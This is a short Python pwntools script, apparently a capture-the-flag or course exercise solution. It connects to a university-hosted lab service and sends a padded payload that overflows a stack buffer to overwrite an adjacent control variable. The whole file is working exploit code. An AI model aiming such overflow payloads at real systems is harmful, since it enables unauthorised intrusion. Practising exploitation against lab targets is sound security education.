#!/bin/python3.11

from pwn import *

# p = process("./bin")
p = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9994)

control = 0xffffcddc
buffer = 0xffffcdcc

offset = control - buffer

payload = b"A" * offset + b"1"

p.sendline(payload)
print(p.recvall())